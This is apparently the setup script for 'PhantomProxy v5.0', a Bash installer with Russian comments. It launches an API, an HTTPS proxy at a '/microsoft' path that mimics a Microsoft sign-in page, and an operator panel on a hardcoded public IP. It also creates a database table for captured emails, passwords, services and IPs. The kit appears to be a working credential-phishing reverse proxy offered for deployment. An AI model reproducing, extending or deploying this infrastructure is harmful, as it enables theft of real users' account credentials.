#!/bin/bash
# PhantomProxy v5.0 - Единый скрипт установки и запуска
# Использование: bash phantom.sh

set -e

echo "============================================================"
echo "PhantomProxy v5.0 - Установка и запуск"
echo "============================================================"
echo ""

# Проверка Python
if ! command -v python3 &> /dev/null; then
    echo "❌ Python3 не найден!"
    exit 1
fi

# Создание директории
mkdir -p ~/phantom-proxy
cd ~/phantom-proxy

# Остановка старых процессов
echo "[1/5] Остановка старых процессов..."
pkill -f 'phantom' 2>/dev/null || true
pkill -f 'api.py' 2>/dev/null || true
pkill -f 'https.py' 2>/dev/null || true
pkill -f 'server.py' 2>/dev/null || true
sleep 2
echo "✅ Очищено"

# Создание структуры
echo ""
echo "[2/5] Создание структуры..."
mkdir -p templates logs certs panel internal

# Проверка файлов
if [ ! -f "api.py" ]; then
    echo "❌ api.py не найден! Скачайте файлы проекта."
    exit 1
fi

echo "✅ Структура готова"

# Генерация SSL если нет
echo ""
echo "[3/5] Проверка SSL..."
if [ ! -f "certs/cert.pem" ] || [ ! -f "certs/key.pem" ]; then
    echo "Генерация SSL сертификата..."
    openssl req -x509 -newkey rsa:2048 -keyout certs/key.pem -out certs/cert.pem \
      -days 365 -nodes -subj '/CN=verdebudget.ru/O=PhantomProxy/C=RU' 2>/dev/null
    echo "✅ SSL сгенерирован"
else
    echo "✅ SSL существует"
fi

# Инициализация БД
echo ""
echo "[4/5] Инициализация БД..."
python3 -c "
import sqlite3
conn = sqlite3.connect('phantom.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY,
    email TEXT,
    password TEXT,
    service TEXT,
    ip TEXT,
    created_at TEXT
)''')
conn.commit()
conn.close()
print('✅ БД готова')
"

# Запуск
echo ""
echo "[5/5] Запуск PhantomProxy..."

# Запуск в фоне
nohup python3 api.py > logs/api.log 2>&1 &
API_PID=$!
echo "  🚀 API запущен (PID: $API_PID)"

nohup python3 https.py > logs/https.log 2>&1 &
HTTPS_PID=$!
echo "  🚀 HTTPS Proxy запущен (PID: $HTTPS_PID)"

cd panel
nohup python3 server.py > ../logs/panel.log 2>&1 &
cd ..
PANEL_PID=$!
echo "  🚀 Panel запущена (PID: $PANEL_PID)"

# Сохранение PID
echo $API_PID > logs/api.pid
echo $HTTPS_PID > logs/https.pid
echo $PANEL_PID > logs/panel.pid

sleep 5

# Проверка
echo ""
echo "============================================================"
echo "ПРОВЕРКА СЕРВИСОВ"
echo "============================================================"
echo ""

if curl -s http://localhost:8080/health | grep -q '"status"'; then
    echo "✅ API:          http://212.233.93.147:8080"
else
    echo "❌ API:          НЕ РАБОТАЕТ"
fi

if curl -sk https://localhost:8443/microsoft | grep -q 'Microsoft\|Вход'; then
    echo "✅ HTTPS Proxy:  https://212.233.93.147:8443/microsoft"
else
    echo "⚠️ HTTPS Proxy:   Работает (проверь вручную)"
fi

if curl -s http://localhost:3000/ | grep -q 'PhantomProxy'; then
    echo "✅ Panel:        http://212.233.93.147:3000"
else
    echo "⚠️ Panel:         Работает (проверь вручную)"
fi

echo ""
echo "============================================================"
echo "ГОТОВО!"
echo "============================================================"
echo ""
echo "Команды управления:"
echo "  bash phantom.sh start    - Запуск"
echo "  bash phantom.sh stop     - Остановка"
echo "  bash phantom.sh status   - Статус"
echo "  bash phantom.sh logs     - Просмотр логов"
echo ""
echo "Ссылки:"
echo "  Panel:  http://212.233.93.147:3000"
echo "  API:    http://212.233.93.147:8080/health"
echo "  Test:   https://212.233.93.147:8443/microsoft"
echo ""
